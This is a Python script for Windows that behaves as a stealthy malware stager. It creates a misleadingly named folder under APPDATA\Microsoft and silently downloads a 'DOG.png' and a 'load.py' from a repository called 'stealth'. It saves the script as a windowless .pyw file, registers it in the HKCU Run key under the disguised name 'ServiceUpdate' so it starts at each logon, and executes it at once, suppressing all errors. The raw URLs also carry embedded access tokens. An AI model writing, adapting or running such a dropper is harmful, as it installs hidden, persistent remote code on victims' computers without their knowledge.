import winreg
import requests
import os


target_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "MyAppliactions")
os.makedirs(target_path, exist_ok=True)
image_path = os.path.join(target_path, "DOG.png")
code_path = os.path.join(target_path,"load.pyw")


def download():
    try:
        if not (os.path.exists(image_path)):
            dog_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/DOG.png?token=GHSAT0AAAAAADD5ISUSXPATLA6DAQF6TMHI2BIWF5Q"
            dog_response = requests.get(dog_url)
            
            try:
                if dog_response.status_code == 200:
                    with open (image_path, "wb") as f:
                        f.write(dog_response.content)  
            except:
                pass 
                        
                        
        if not (os.path.exists(code_path)):
            code_url = "https://raw.githubusercontent.com/kimon270270/stealth/refs/heads/main/load.py?token=GHSAT0AAAAAADD5ISUTJBDLRW2JYIU5YRMG2BIWEOA"
            code_response = requests.get(code_url)
            
            try:
                if code_response.status_code == 200:
                    with open (code_path, "wb") as f:
                        f.write(code_response.content)    
            except:
                pass                       
    except:
        pass
    
def update_registry():
     
     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , winreg.KEY_ALL_ACCESS) as key:
         winreg.SetValueEx(key, "ServiceUpdate", 0, winreg.REG_SZ, f'"pythonw.exe""{code_path}"')
    
    
def run_load():
    os.system(f"pythonw {code_path}")    
    
download()
update_registry()
run_load()